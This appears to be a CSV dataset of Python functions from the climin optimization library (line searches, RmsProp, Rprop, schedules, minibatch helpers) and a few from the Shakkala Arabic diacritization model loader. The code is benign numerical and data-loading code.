Repository,Function_Name,Function_Code
BRML/climin,__init__,"def __init__(self, wrt):
    self.wrt = wrt"
BRML/climin,search,"def search(self, direction, initialization, args=None, kwargs=None):
    raise NotImplemented()"
BRML/climin,__init__,"def __init__(self, wrt, f, decay=0.9, max_iter=float('inf'), tolerance=1e-20):
    """"""Create BackTrack object.

        Parameters
        ----------

        wrt : array_like
            Parameters over which the optimization is done.

        f : Callable
            Objective function.

        decay : float
            Factor to multiply trials for the step length with.

        max_iter : int, optional, default infinity
            Number of step lengths to try.

        tolerance : float
            Minimum absolute value of a component of the step without stopping the
            line search.
        """"""
    super(BackTrack, self).__init__(wrt)
    self.f = f
    self.max_iter = max_iter
    self.decay = decay
    self.tolerance = tolerance"
BRML/climin,search,"def search(self, direction, initialization=1, args=None, kwargs=None, loss0=None):
    """"""Return a step length ``t`` given a search direction.

        Perform the line search along a direction. Search will start at
        ``initialization`` and assume that the loss is ``loss0`` at ``t == 0``.

        Parameters
        ----------

        direction : array_like
            Has to be of the same size as .wrt. Points along that direction
            will tried out to reduce the loss.

        initialization : float
            First attempt for a step size. Will be reduced by a factor of
            ``.decay`` afterwards.

        args : list, optional, default: None
            list of optional arguments for ``.f``.

        kwargs : dictionary, optional, default: None
            list of optional keyword arguments for ``.f``.

        loss0 : float, optional
            Loss at the current parameters. Will be calculated of not given.
        """"""
    args = [] if args is None else args
    kwargs = {} if kwargs is None else kwargs
    if loss0 is None:
        loss0 = self.f(self.wrt, *args, **kwargs)
    schedule = (self.decay ** i * initialization for i in itertools.count())
    for (i, s) in enumerate(schedule):
        if i + 1 >= self.max_iter:
            break
        step = initialization * s * direction
        if abs(step).max() < self.tolerance:
            break
        candidate = self.wrt + step
        loss = self.f(candidate, *args, **kwargs)
        if -(loss0 - loss) < 0:
            return s
    return 0"
BRML/climin,__init__,"def __init__(self, wrt, f, fprime, decay=None, c1=0.0001, c2=0.9, tolerance=1e-20):
    """"""Create StrongWolfeBackTrack object.

        Parameters
        ----------

        wrt : array_like
            Parameters over which the optimization is done.

        f : Callable
            Objective function.

        decay : float
            Factor to multiply trials for the step length with.

        tolerance : float
            Minimum absolute value of a component of the step without stopping
            the line search.
        """"""
    super(StrongWolfeBackTrack, self).__init__(wrt, f, decay, tolerance)
    self.fprime = fprime
    self.c1 = c1
    self.c2 = c2"
BRML/climin,search,"def search(self, direction, args, kwargs, loss0=None):
    if loss0 is None:
        loss0 = self.f(self.wrt, *args, **kwargs)
    self.grad = grad0 = self.fprime(self.wrt, *args, **kwargs)
    dir_dot_grad0 = scipy.inner(direction, grad0)
    for s in self.schedule:
        step = s * direction
        if abs(step.max()) < self.tolerance:
            break
        candidate = self.wrt + step
        loss = self.f(candidate, *args, **kwargs)
        if loss <= loss0 + self.c1 * s * dir_dot_grad0:
            grad = self.fprime(candidate, *args, **kwargs)
            dir_dot_grad = scipy.inner(direction, grad)
            if abs(dir_dot_grad) <= self.c2 * abs(dir_dot_grad0):
                self.grad = grad
                return s
    return 0.0"
BRML/climin,__init__,"def __init__(self, wrt, f, fprime):
    super(ScipyLineSearch, self).__init__(wrt)
    self.f = f
    self.fprime = fprime"
BRML/climin,search,"def search(self, direction, args, kwargs):
    if kwargs:
        raise ValueError('keyword arguments not supported')
    gfk = self.fprime(self.wrt, *args)
    return scipy.optimize.line_search(self.f, self.fprime, self.wrt, direction, gfk, args=args)[0]"
BRML/climin,__init__,"def __init__(self, wrt, f, fprime, c1=0.0001, c2=0.9, maxiter=25, min_step_length=1e-09, typ=4):
    super(WolfeLineSearch, self).__init__(wrt)
    self.f = f
    self.fprime = fprime
    self.c1 = c1
    self.c2 = c2
    self.maxiter = maxiter
    self.min_step_length = min_step_length
    self.typ = typ
    self.first_try = True"
BRML/climin,search,"def search(self, direction, initialization=None, args=None, kwargs=None, loss0=None):
    args = args if args is not None else ()
    kwargs = kwargs if kwargs is not None else {}
    loss0 = self.f(self.wrt, *args, **kwargs) if loss0 is None else loss0
    grad0 = self.fprime(self.wrt, *args, **kwargs)
    direct_deriv0 = scipy.inner(grad0, direction)
    f = lambda x: (self.f(x, *args, **kwargs), self.fprime(x, *args, **kwargs))
    if self.first_try:
        self.first_try = False
        t = min(1, 1 / sum(abs(grad0)))
    else:
        t = initialization if initialization is not None else 1
    (step, fstep, fprimestep, n_evals) = wolfe_line_search(self.wrt, t, direction, loss0, grad0, direct_deriv0, self.c1, self.c2, self.typ, self.maxiter, self.min_step_length, f)
    self.val = fstep
    self.grad = fprimestep
    return step"
BRML/climin,sqrt,"def sqrt(x):
    """"""Return an array of the same shape containing the element square
    root of `x`.""""""
    return x ** 0.5"
BRML/climin,zero_like,"def zero_like(x):
    """"""Return an array of the same shape as `x` containing only zeros.""""""
    return x * 0.0"
BRML/climin,ones_like,"def ones_like(x):
    """"""Return an array of the same shape as `x` containing only ones.""""""
    return x * 0.0 + 1.0"
BRML/climin,clip,"def clip(a, a_min, a_max):
    """"""Clip (limit) the values in an array.

    Given an interval, values outside the interval are clipped to the interval
    edges. For example, if an interval of [0, 1] is specified, values smaller
    than 0 become 0, and values larger than 1 become 1.""""""
    if not isinstance(a, np.ndarray):
        max_mask = a > a_max
        max_tar = gp.ones(a.shape) * a_max
        min_mask = a < a_min
        min_tar = gp.ones(a.shape) * a_min
        a_clipped = a * (1 - max_mask - min_mask) + max_tar * max_mask + min_tar * min_mask
        return a_clipped
    else:
        return np.clip(a, a_min, a_max)"
BRML/climin,sign,"def sign(x):
    """"""Returns an element-wise indication of the sign of a number.""""""
    if not isinstance(x, np.ndarray):
        return gp.sign(x)
    else:
        return np.sign(x)"
BRML/climin,where,"def where(x, *args):
    """"""Delegate to gnumpy.where or numpy.where depending on the type of `x`.""""""
    if not isinstance(x, np.ndarray):
        return gp.where(x, *args)
    else:
        return np.where(x, *args)"
BRML/climin,random_like,"def random_like(x):
    """"""Return an array of the same shape as `x` filled with random numbers from
    the interval [0, 1).""""""
    if not isinstance(x, np.ndarray):
        return gp.rand(x.shape)
    else:
        return np.random.random(x.shape)"
BRML/climin,random_normal_like,"def random_normal_like(x, loc, scale):
    """"""Return an array of the same shape as `x` filled with random numbers from
    the interval [0, 1).""""""
    if not isinstance(x, np.ndarray):
        return gp.randn(*x.shape) * scale + loc
    else:
        return np.random.normal(loc, scale, x.shape)"
BRML/climin,assert_numpy,"def assert_numpy(x):
    """"""Given a gnumpy or numpy array x, return an array with the same contents.""""""
    if not isinstance(x, np.ndarray):
        x = x.as_numpy_array()
    else:
        x = x.copy()
    return x"
BRML/climin,scalar,"def scalar(x):
    if isinstance(x, float):
        return x
    if not x.size == 1:
        raise ValueError('size is %i instead of 1' % x.size)
    return x.reshape((1,))[0]"
BRML/climin,isnan,"def isnan(x):
    """"""Delegate to gnumpy.isnan or numpy.isnan depending on the type of `x`.""""""
    if not isinstance(x, np.ndarray):
        return gp.isnan(x)
    else:
        return np.isnan(x)"
BRML/climin,__init__,"def __init__(self, wrt, f, args=None):
    super(Xnes, self).__init__(wrt, args=args)
    self._f = f
    dim = self.wrt.shape[0]
    log_dim = scipy.log(dim)
    self.step_rate = 0.6 * (3 + log_dim) / dim / scipy.sqrt(dim)
    self.batch_size = 4 + int(scipy.floor(3 * log_dim))"
BRML/climin,set_from_info,"def set_from_info(self, info):
    raise NotImplemented('nobody has found the time to implement this yet')"
BRML/climin,extended_info,"def extended_info(self, **kwargs):
    raise NotImplemented('nobody has found the time to implement this yet')"
BRML/climin,f,"def f(self, x, *args, **kwargs):
    return -self._f(x, *args, **kwargs)"
BRML/climin,__iter__,"def __iter__(self):
    dim = self.wrt.shape[0]
    I = scipy.eye(dim)
    A = scipy.eye(dim)
    center = self.wrt.copy()
    n_evals = 0
    best_wrt = None
    best_x = float('-inf')
    for (i, (args, kwargs)) in enumerate(self.args):
        samples = scipy.random.standard_normal((self.batch_size, dim))
        samples = scipy.dot(samples, A) + center
        fitnesses = [self.f(samples[j], *args, **kwargs) for j in range(samples.shape[0])]
        fitnesses = scipy.array(fitnesses).flatten()
        if fitnesses.max() > best_x:
            best_loss = fitnesses.max()
            self.wrt[:] = samples[fitnesses.argmax()]
        utilities = self.compute_utilities(fitnesses)
        center += scipy.dot(scipy.dot(utilities, samples), A)
        cov_gradient = sum([u * (scipy.outer(s, s) - I) for (s, u) in zip(samples, utilities)])
        update = scipy.linalg.expm2(A * cov_gradient * self.step_rate * 0.5)
        A[:] = scipy.dot(A, update)
        yield dict(loss=-best_x, n_iter=i)"
BRML/climin,compute_utilities,"def compute_utilities(self, fitnesses):
    n_fitnesses = fitnesses.shape[0]
    ranks = scipy.zeros_like(fitnesses)
    l = sorted(enumerate(fitnesses), key=lambda x: x[1])
    for (i, (j, _)) in enumerate(l):
        ranks[j] = i
    utilities = -scipy.log((n_fitnesses - ranks).astype('float64'))
    utilities += scipy.log(n_fitnesses / 2.0 + 1.0)
    utilities = scipy.clip(utilities, 0, float('inf'))
    utilities /= utilities.sum()
    utilities -= 1.0 / n_fitnesses
    return utilities"
BRML/climin,max_length_columns,"def max_length_columns(arr, max_length):
    """"""Project the columns of an array below a certain length.

    Works in place.

    Parameters
    ----------

    arr : array_like
        2D array.

    max_length : int
        Maximum length of a column.
    """"""
    if arr.ndim != 2:
        raise ValueError('only 2d arrays allowed')
    max_length = float(max_length)
    lengths = sqrt((arr ** 2).sum(axis=0))
    too_big_by = lengths / max_length
    divisor = too_big_by
    non_violated = lengths < max_length
    if isinstance(arr, np.ndarray):
        divisor[np.where(non_violated)] = 1.0
    else:
        for (i, nv) in enumerate(non_violated):
            if nv:
                divisor[i] = 1.0
    arr /= divisor[np.newaxis]"
BRML/climin,step_rate,"@property
def step_rate(self):
    return self._step_rate"
BRML/climin,step_rate,"@step_rate.setter
def step_rate(self, value):
    self._step_rate = value
    if self.step_adapt:
        self._step_rate *= ones_like(self.wrt)"
BRML/climin,__init__,"def __init__(self, wrt, fprime, step_rate, decay=0.9, momentum=0, step_adapt=False, step_rate_min=0, step_rate_max=np.inf, args=None):
    """"""Create an RmsProp object.

        Parameters
        ----------

        wrt : array_like
            Array that represents the solution. Will be operated upon in
            place.  ``fprime`` should accept this array as a first argument.

        fprime : callable
            Callable that given a solution vector as first parameter and *args
            and **kwargs drawn from the iterations ``args`` returns a
            search direction, such as a gradient.

        step_rate : float or array_like
            Step rate to use during optimization. Can be given as a single
            scalar value or as an array for a different step rate of each
            parameter of the problem.

        decay : float
            Decay parameter for the moving average. Must lie in [0, 1) where
            lower numbers means a shorter ""memory"".

        momentum : float or array_like
          Momentum to use during optimization. Can be specified analoguously
          (but independent of) step rate.

        step_adapt : float or bool
            Constant to adapt step rates. If False, step rate adaption is not done.

        step_rate_min : float, optional, default 0
            When adapting step rates, do not move below this value.

        step_rate_max : float, optional, default inf
            When adapting step rates, do not move above this value.

        args : iterable
            Iterator over arguments which ``fprime`` will be called with.
        """"""
    super(RmsProp, self).__init__(wrt, args=args)
    self.fprime = fprime
    self.decay = decay
    self.momentum = momentum
    self.step_adapt = step_adapt
    self.step_rate_min = step_rate_min
    self.step_rate_max = step_rate_max
    self.step_rate = step_rate
    self.moving_mean_squared = 1
    self.step = 0"
BRML/climin,_iterate,"def _iterate(self):
    for (args, kwargs) in self.args:
        step_m1 = self.step
        step1 = step_m1 * self.momentum
        self.wrt -= step1
        gradient = self.fprime(self.wrt, *args, **kwargs)
        self.moving_mean_squared = self.decay * self.moving_mean_squared + (1 - self.decay) * gradient ** 2
        step2 = self.step_rate * gradient
        step2 /= sqrt(self.moving_mean_squared + 1e-08)
        self.wrt -= step2
        step = step1 + step2
        if self.step_adapt:
            step_non_negative = step > 0
            step_m1_non_negative = step_m1 > 0
            agree = (step_non_negative == step_m1_non_negative) * 1.0
            adapt = 1 + agree * self.step_adapt * 2 - self.step_adapt
            self.step_rate *= adapt
            self.step_rate = clip(self.step_rate, self.step_rate_min, self.step_rate_max)
        self.step = step
        self.n_iter += 1
        yield dict(gradient=gradient, args=args, kwargs=kwargs)"
BRML/climin,__init__,"def __init__(self, wrt, fprime, step_shrink=0.5, step_grow=1.2, min_step=1e-06, max_step=1, changes_max=0.1, args=None):
    """"""Create an Rprop object.

        Parameters
        ----------

        wrt : array_like
            Current solution to the problem. Can be given as a first argument
            to ``.fprime``.

        fprime : Callable
            First derivative of the objective function. Returns an array of the
            same shape as ``.wrt``.

        step_shrink : float
            Constant to shrink step rates by if the gradients of the error do
            not agree over time.

        step_grow : float
            Constant to grow step rates by if the gradients of the error do
            agree over time.

        min_step : float
            Minimum step rate.

        max_step : float
            Maximum step rate.

        args : iterable
            Iterator over arguments which ``fprime`` will be called with.
        """"""
    super(Rprop, self).__init__(wrt, args=args)
    self.fprime = fprime
    self.step_shrink = step_shrink
    self.step_grow = step_grow
    self.min_step = min_step
    self.max_step = max_step
    self.changes_max = changes_max
    self.gradient = ma.zero_like(self.wrt)
    self.changes = ma.zero_like(self.wrt)"
BRML/climin,_iterate,"def _iterate(self):
    for (args, kwargs) in self.args:
        gradient_m1 = self.gradient
        self.gradient = self.fprime(self.wrt, *args, **kwargs)
        gradprod = gradient_m1 * self.gradient
        self.changes[gradprod > 0] *= self.step_grow
        self.changes[gradprod < 0] *= self.step_shrink
        self.changes = ma.clip(self.changes, self.min_step, self.max_step)
        step = -self.changes * ma.sign(self.gradient)
        self.wrt += step
        self.n_iter += 1
        yield {'args': args, 'kwargs': kwargs, 'step': step}"
BRML/climin,decaying,"def decaying(start, decay):
    """"""Return an iterator of exponentially decaying values.

    The first value is ``start``. Every further value is obtained by multiplying
    the last one by a factor of ``decay``.

    Examples
    --------

    >>> from climin.schedule import decaying
    >>> s = decaying(10, .9)
    >>> [next(s) for i in range(5)]
    [10.0, 9.0, 8.100000000000001, 7.290000000000001, 6.561]
    """"""
    return (start * decay ** i for i in itertools.count(0))"
BRML/climin,linear_annealing,"def linear_annealing(start, stop, n_steps):
    """"""Return an iterator that anneals linearly to a point linearly.

    The first value is ``start``, the last value is ``stop``. The annealing will
    be linear over ``n_steps`` iterations. After that, ``stop`` is yielded.

    Examples
    --------

    >>> from climin.schedule import linear_annealing
    >>> s = linear_annealing(1, 0, 4)
    >>> [next(s) for i in range(10)]
    [1.0, 0.75, 0.5, 0.25, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0]
    """"""
    (start, stop) = (float(start), float(stop))
    inc = (stop - start) / n_steps
    for i in range(n_steps):
        yield (start + i * inc)
    while True:
        yield stop"
BRML/climin,repeater,"def repeater(iter, n):
    """"""Return an iterator that repeats each element of `iter` exactly
    `n` times before moving on to the next element.

    Examples
    --------

    >>> from climin.schedule import repeater
    >>> s = repeater([1, 2, 3], 2)
    >>> [next(s) for i in range(6)]
    [1, 1, 2, 2, 3, 3]
    """"""
    for i in iter:
        for j in range(n):
            yield i"
BRML/climin,__init__,"def __init__(self, max_momentum, stretch=250):
    self.max_momentum = max_momentum
    self.stretch = stretch"
BRML/climin,__iter__,"def __iter__(self):
    for i in itertools.count(1):
        m = 1 - 2 ** (-1 - math.log(np.floor_divide(i, self.stretch) + 1, 2))
        yield min(m, self.max_momentum)"
BRML/climin,__init__,"def __init__(self, wrt, f, fprime, f_Hp, lmbd=0.99, mu=0.02, eta0=5e-05, args=None):
    super(Smd, self).__init__(wrt, args=args)
    self.f = f
    self.fprime = fprime
    self.f_Hp = f_Hp
    self.lmbd = lmbd
    self.mu = mu
    self.eta0 = eta0"
BRML/climin,set_from_info,"def set_from_info(self, info):
    raise NotImplemented('nobody has found the time to implement this yet')"
BRML/climin,extended_info,"def extended_info(self, **kwargs):
    raise NotImplemented('nobody has found the time to implement this yet')"
BRML/climin,__iter__,"def __iter__(self):
    p = np.size(self.wrt)
    v = 0.0001 * np.random.randn(p)
    eta = self.eta0 * np.ones(p)
    for (i, (args, kwargs)) in enumerate(self.args):
        gradient = self.fprime(self.wrt, *args, **kwargs)
        if not is_nonzerofinite(gradient):
            warnings.warn('gradient is either zero, nan or inf')
            break
        Hp = self.f_Hp(self.wrt, v, *args, **kwargs)
        eta = eta * np.maximum(0.5, 1 + self.mu * v * gradient)
        v *= self.lmbd
        v += eta * (gradient - self.lmbd * Hp)
        self.wrt -= eta * gradient
        yield {'n_iter': i, 'args': args, 'kwargs': kwargs, 'gradient': gradient, 'v': v, 'eta': eta}"
BRML/climin,is_garray,"def is_garray(cand):
    return hasattr(cand, 'as_numpy_array')"
BRML/climin,is_array,"def is_array(cand):
    return is_garray(cand) or isinstance(cand, np.ndarray)"
BRML/climin,clear_info,"def clear_info(info):
    """"""Clean up contents of info dictionary for better use.

    Keys to be removed are ``args``, ``kwargs`` and any non-scalar numpy or
    gnumpy arrays. Numpy scalars are converted to floats.

    Examples
    --------

    >>> import numpy as np
    >>> info = {'args': None, 'foo': np.zeros(3), 'bar': np.array(1),
    ...         'loss': 1.}
    >>> cleared = clear_info(info)
    >>> cleared == {'bar': 1.0, 'loss': 1.0}
    True
    """"""
    items = info.iteritems()
    items = ((k, float(v.reshape((1,))[0]) if is_array(v) and v.size == 1 else v) for (k, v) in items)
    items = ((k, v) for (k, v) in items if not is_array(v))
    items = ((k, v) for (k, v) in items if k not in ('args', 'kwargs'))
    return dict(items)"
BRML/climin,coroutine,"def coroutine(f):
    """"""Turn a generator function into a coroutine by calling .next() once.""""""

    def started(*args, **kwargs):
        cr = f(*args, **kwargs)
        next(cr)
        return cr
    return started"
BRML/climin,aslist,"def aslist(item):
    if not isinstance(item, (list, tuple)):
        item = [item]
    return item"
BRML/climin,mini_slices,"def mini_slices(n_samples, batch_size):
    """"""Yield slices of size `batch_size` that work with a container of length
    `n_samples`.""""""
    (n_batches, rest) = divmod(n_samples, batch_size)
    if rest != 0:
        n_batches += 1
    return [slice(i * batch_size, (i + 1) * batch_size) for i in range(n_batches)]"
BRML/climin,draw_mini_slices,"def draw_mini_slices(n_samples, batch_size, with_replacement=False):
    slices = mini_slices(n_samples, batch_size)
    idxs = list(range(len(slices)))
    if with_replacement:
        yield random.choice(slices)
    else:
        while True:
            random.shuffle(idxs)
            for i in idxs:
                yield slices[i]"
BRML/climin,draw_mini_indices,"def draw_mini_indices(n_samples, batch_size):
    assert n_samples > batch_size
    idxs = list(range(n_samples))
    random.shuffle(idxs)
    pos = 0
    while True:
        while pos + batch_size <= n_samples:
            yield idxs[pos:pos + batch_size]
            pos += batch_size
        batch = idxs[pos:]
        needed = batch_size - len(batch)
        random.shuffle(idxs)
        batch += idxs[0:needed]
        yield batch
        pos = needed"
BRML/climin,optimizer,"def optimizer(identifier, wrt, *args, **kwargs):
    """"""Return an optimizer with the desired configuration.

    This is a convenience function if one wants to try out different optimizers
    but wants to change as little code as possible.

    Additional arguments and keyword arguments will be passed to the constructor
    of the class. If the found class does not take the arguments supplied, this
    will `not` throw an error, but pass silently.

    :param identifier: String identifying the optimizer to use. Can be either
        ``asgd``, ``gd``, ``lbfgs``, ``ncg``, ``rprop``, ``adadelta`` or
        ``smd``.
    :param wrt: Numpy array pointing to the data to optimize.
    """"""
    klass_map = {'gd': GradientDescent, 'lbfgs': Lbfgs, 'ncg': NonlinearConjugateGradient, 'rprop': Rprop, 'rmsprop': RmsProp, 'adadelta': Adadelta, 'adam': Adam}
    klass = klass_map[identifier]
    argspec = inspect.getargspec(klass.__init__)
    if argspec.keywords is None:
        expected_keys = set(argspec.args)
        given_keys = set(kwargs.keys())
        unused_keys = given_keys - expected_keys
        for i in unused_keys:
            warnings.warn('Argument named %s is not expected by %s' % (i, klass))
        used_keys = expected_keys & given_keys
        kwargs = dict(((k, kwargs[k]) for k in used_keys))
    try:
        opt = klass(wrt, *args, **kwargs)
    except TypeError:
        raise TypeError('required arguments for %s: %s' % (klass, argspec.args))
    return opt"
BRML/climin,shaped_from_flat,"def shaped_from_flat(flat, shapes):
    """"""Given a one dimensional array ``flat``, return a list of views of shapes
    ``shapes`` on that array.

    Each view will point to a distinct memory region, consecutively allocated
    in flat.

    Parameters
    ----------

    flat : array_like
        Array of one dimension.

    shapes : list of tuples of ints
        Each entry of this list specifies the shape of the corresponding view
        into ``flat``.

    Returns
    -------

    views : list of arrays
        Each entry has the shape given in ``shapes`` and points as a view into
        ``flat``.
    """"""
    shapes = [(i,) if isinstance(i, int) else i for i in shapes]
    sizes = [np.prod(i) for i in shapes]
    n_used = 0
    views = []
    for (size, shape) in zip(sizes, shapes):
        this = flat[n_used:n_used + size]
        n_used += size
        this.shape = shape
        views.append(this)
    return views"
BRML/climin,empty_with_views,"def empty_with_views(shapes, empty_func=np.empty):
    """"""Create an array and views shaped according to ``shapes``.

    The ``shapes`` parameter is a list of tuples of ints.  Each tuple
    represents a desired shape for an array which will be allocated in a bigger
    memory region. This memory region will be represented by an array as well.

    For example, the shape speciciation ``[2, (3, 2)]`` will create an array
    ``flat`` of size 8. The first view will have a size of ``(2,)`` and point
    to the first two entries, i.e. ``flat`[:2]`, while the second array will
    have a shape of ``(3, 2)`` and point to the elements ``flat[2:8]``.


    Parameters
    ----------

    spec : list of tuples of ints
        Specification of the desired shapes.

    empty_func : callable
        function that returns a memory region given an integer of the desired
        size. (Examples include ``numpy.empty``, which is the default,
        ``gnumpy.empty`` and ``theano.tensor.empty``.


    Returns
    -------

    flat : array_like (depending on ``empty_func``)
        Memory region containing all the views.

    views : list of array_like
        Variable number of results. Each contains a view into the array
        ``flat``.


    Examples
    --------

    >>> from climin.util import empty_with_views
    >>> flat, (w, b) = empty_with_views([(3, 2), 2])
    >>> w[...] = 1
    >>> b[...] = 2
    >>> flat
    array([ 1.,  1.,  1.,  1.,  1.,  1.,  2.,  2.])
    >>> flat[0] = 3
    >>> w
    array([[ 3.,  1.],
           [ 1.,  1.],
           [ 1.,  1.]])

    """"""
    shapes = [(i,) if isinstance(i, int) else i for i in shapes]
    sizes = [np.prod(i) for i in shapes]
    n_pars = sum(sizes)
    flat = empty_func(n_pars)
    views = shaped_from_flat(flat, shapes)
    return (flat, views)"
BRML/climin,arbitrary_slice,"def arbitrary_slice(arr, start, stop=None, axis=0):
    """"""Return a slice from `start` to `stop` in dimension `axis` of array `arr`.


    Parameters
    ----------

    arr : array_like
        Can be numpy ndarray, hdf5 dataset, or list.
        If ``arr`` is a list, ``axis`` must be 0.

    start : int
        Index at which to start slicing.

    stop : int, optional [default: None]
        Index at which to stop slicing.
        If not specified, the axis is sliced until its end.

    axis : int, optional [default: 0]
        Axis along which should be sliced


    Returns
    -------

    slice : array_like
        The respective slice of ``arr``
    """"""
    if type(arr) is list:
        if axis == 0:
            return arr[start:stop]
        else:
            raise ValueError('Cannot slice a list in non-zero axis {}'.format(axis))
    n_axes = len(arr.shape)
    if axis >= n_axes:
        raise IndexError('Argument `axis` with value {} out of range. Must be smaller than rank {} of `arr`.'.format(axis, n_axes))
    this_slice = [slice(None) for _ in range(n_axes)]
    this_slice[axis] = slice(start, stop)
    return arr[tuple(this_slice)]"
BRML/climin,minibatches,"def minibatches(arr, batch_size, d=0):
    """"""Return a list of views of the given arr.

    Each view represents a mini bach of the data.

    Parameters
    ----------

    arr : array_like
        Array to obtain batches from. Needs to be slicable. If ``d > 0``, needs
        to have a ``.shape`` attribute from which the number of samples can
        be obtained.

    batch_size : int
        Size of a batch. Last batch might be smaller if ``batch_size`` is not a
        divisor of ``arr``.

    d : int, optional, default: 0
        Dimension along which the data samples are separated and thus slicing
        should be done.

    Returns
    -------

    mini_batches : list
        Each item of the list is a view of ``arr``. Views are ordered.
    """"""
    if d == 0:
        (n_batches, rest) = divmod(len(arr), batch_size)
    else:
        (n_batches, rest) = divmod(arr.shape[d], batch_size)
    if rest:
        n_batches += 1
    slices = (slice(i * batch_size, (i + 1) * batch_size) for i in range(n_batches))
    if d == 0:
        res = [arr[i] for i in slices]
    elif d == 1:
        res = [arr[:, i] for i in slices]
    elif d == 2:
        res = [arr[:, :, i] for i in slices]
    return res"
BRML/climin,iter_minibatches,"def iter_minibatches(lst, batch_size, dims, n_cycles=None, random_state=None, discard_illsized_batch=False):
    """"""Return an iterator that successively yields tuples containing aligned
    minibatches of size `batch_size` from slicable objects given in `lst`, in
    random order without replacement.
    Because different containers might require slicing over different
    dimensions, the dimension of each container has to be givens as a list
    `dims`.


    Parameters
    ----------

    lst : list of array_like
        Each item of the list will be sliced into mini batches in alignment
        with the others.

    batch_size : int
        Size of each batch. Last batch might be smaller.

    dims : list
        Aligned with ``lst``, gives the dimension along which the data samples
        are separated.

    n_cycles : int, optional [default: None]
        Number of cycles after which to stop the iterator. If ``None``, will
        yield forever.

    random_state : a numpy.random.RandomState object, optional [default : None]
        Random number generator that will act as a seed for the minibatch order.

    discard_illsized_batch : bool, optional [default : False]
        If ``True`` and the length of the sliced dimension is not divisible by
        ``batch_size``, the leftover samples are discarded.


    Returns
    -------
    batches : iterator
        Infinite iterator of mini batches in random order (without replacement).
    """"""
    if type(n_cycles) == bool and (not n_cycles):
        n_cycles = None
        warnings.warn('n_cycles=False kwarg to iter_minibatches deprecated. Using n_cycles=None instead.')
    try:
        dm_result = [divmod(len(arr), batch_size) if d == 0 else divmod(arr.shape[d], batch_size) for (arr, d) in zip(lst, dims)]
    except AttributeError:
        raise AttributeError(""'list' object has no attribute 'shape'. Trying to slice a list in a non-zero axis."")
    except IndexError:
        raise IndexError('tuple index out of range. Trying to slice along a non-existing dimension.')
    if dm_result.count(dm_result[0]) == len(dm_result):
        (n_batches, rest) = dm_result[0]
        if rest and (not discard_illsized_batch):
            n_batches += 1
    else:
        raise ValueError('The axes along which to slice have unequal lengths.')
    if random_state is not None:
        random.seed(random_state.normal())
    counter = itertools.count()
    count = next(counter)
    while True:
        indices = range(n_batches)
        while True:
            if n_cycles is not None and count >= n_cycles:
                raise StopIteration()
            count = next(counter)
            random.shuffle(indices)
            for i in indices:
                start = i * batch_size
                stop = (i + 1) * batch_size
                batch = [arbitrary_slice(arr, start, stop, axis) for (arr, axis) in zip(lst, dims)]
                yield tuple(batch)"
BRML/climin,started,"def started(*args, **kwargs):
    cr = f(*args, **kwargs)
    next(cr)
    return cr"
BRML/climin,__init__,"def __init__(self, **options):
    """"""Create an OptimizerDistribution object.

        Parameters
        ----------

        options : dict
            Maps an optimizer key to a grid to sample from.
        """"""
    self.options = options"
BRML/climin,rvs,"def rvs(self):
    opt = random.choice(list(self.options.keys()))
    grid = self.options[opt]
    sample = list(ParameterSampler(grid, n_iter=1))[0]
    return (opt, sample)"
Barqawiz/Shakkala,__init__,"def __init__(self, folder_location=None, version=3):
    if folder_location is None:
        folder_location = os.path.dirname(os.path.abspath(__file__))
    assert folder_location != None, 'model_location cant be empty, send location of keras model'
    model_folder = os.path.join(folder_location, 'model')
    if version == 1:
        self.max_sentence = 495
        self.model_location = os.path.join(model_folder, 'simple_model' + '.h5')
    elif version == 2:
        self.max_sentence = 315
        self.model_location = os.path.join(model_folder, 'middle_model' + '.h5')
    elif version == 3:
        self.max_sentence = 315
        self.model_location = os.path.join(model_folder, 'second_model6' + '.h5')
    dictionary_folder = os.path.join(folder_location, 'dictionary')
    input_vocab_to_int = helper.load_binary('input_vocab_to_int', dictionary_folder)
    output_int_to_vocab = helper.load_binary('output_int_to_vocab', dictionary_folder)
    self.dictionary = {'input_vocab_to_int': input_vocab_to_int, 'output_int_to_vocab': output_int_to_vocab}"
Barqawiz/Shakkala,get_model,"def get_model(self):
    print('start load model')
    model = load_model(self.model_location)
    print('end load model')
    graph = tf.compat.v1.get_default_graph()
    return (model, graph)"
Barqawiz/Shakkala,prepare_input,"def prepare_input(self, input_sent):
    assert input_sent != None and len(input_sent) < self.max_sentence, 'max length for input_sent should be {} characters, you can split the sentence into multiple sentecens and call the function'.format(self.max_sentence)
    input_sent = [input_sent]
    return self.__preprocess(input_sent)"
